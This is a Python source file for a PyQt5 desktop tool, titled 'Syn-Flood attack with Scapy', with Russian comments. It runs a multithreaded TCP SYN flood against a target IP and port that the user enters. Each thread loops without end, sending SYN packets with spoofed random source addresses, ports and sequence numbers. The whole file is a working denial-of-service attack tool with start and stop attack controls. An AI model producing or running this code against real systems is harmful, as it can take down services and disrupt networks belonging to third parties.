from PyQt5 import QtCore, QtGui, QtWidgets
from syn_flood_face import *
import sys
import json
from random import randint
from threading import Thread
from scapy.layers.inet import IP, TCP
from scapy.sendrecv import send

packets = 0
is_run = False
stop_thread = False

class MyWin(QtWidgets.QMainWindow):
    def __init__(self):
        super(MyWin, self).__init__()
        self.ui = Ui_MainWindow()
        self.ui.setupUi(self)
        self.ui.runBotton.clicked.connect(lambda: self.run())
        self.ui.dstIP.setText("1.1.1.1")
        self.ui.dstPort.setText("80")
        self.ui.packetsCount.setText("0")
        self.ui.treadsCount.setText("5")
        self.setWindowTitle("Syn-Flood attack with Scapy")

    def run(self):
        global is_run
        global stop_thread
        if (is_run == False):
            try:
                t_ip = self.ui.dstIP.text()
                t_port = int(self.ui.dstPort.text())
                count = int(self.ui.treadsCount.text())

                #SYN_Flood(t_ip, t_port,count)
                create_threads(count, t_ip, t_port)
            except:
                self.ui.statusbar.showMessage("Проверьте корректность ввода", 5000)
        else:
            is_run = False
            stop_thread = False
            self.ui.runBotton.setText("Начать атаку")








class MyThread(Thread):
    def __init__(self, name, t_ip, t_port ):
        Thread.__init__(self)
        self.name = name
        self.t_ip = t_ip
        self.t_port = t_port

    def run(self):
        print("Запущен " + self.name +"\n")
        global is_run
        is_run = True

        SYN_Flood(self.t_ip, self.t_port)





def create_threads(count, t_ip, t_port): # создаем count потоков, которые выполняют дудос

    myapp.ui.runBotton.setText("Остановить атаку")
    for i in range(count):
        name = "поток #" + str(i+1)

        my_thread = MyThread(name, t_ip, t_port)
        my_thread.start()





def randomIP():
    ip = ".".join(map(str, (randint(0, 255) for i in range(4))))  # генерируем случайны ip
    return ip


def SYN_Flood(t_ip, t_port):

    print("Пакеты отправляются")
    global stop_thread
    stop_thread = True

    while stop_thread:
        global packets
        ip_p = IP()
        ip_p.src = randomIP()  # записываем в поле ip источника случайный ip
        #ip_p.src = "8.8.8.8"
        ip_p.dst = t_ip  # записываем ip сервера

        tcp_p = TCP()
        #tcp_p.sport = 234
        tcp_p.sport = randint(0, 6000)  # записываем в поле port источника случайный port
        tcp_p.dport = t_port  # записываем port сервер
        tcp_p.flags = "S"  # устанавливаем флаг SYN
        tcp_p.seq = randint(0, 9000)  # устанавливаем случайный порядковый номер ?
        tcp_p.window = randint(5000, 8191)  # устанавливаем случайное окно ?

        send(ip_p / tcp_p, verbose=False)  # отправляем пакет
        packets += 1
        myapp.ui.packetsCount.setText(str(packets))
        # print("Пакет {0} отправлен".format(i + 1))

    packets = 0
    myapp.ui.packetsCount.setText(str(packets))

    # print("Все пакеты отправлены")



if __name__ =="__main__":
    app = QtWidgets.QApplication(sys.argv)
    myapp = MyWin()
    myapp.setFixedSize(330, 490)
    myapp.show()
    sys.exit(app.exec_())
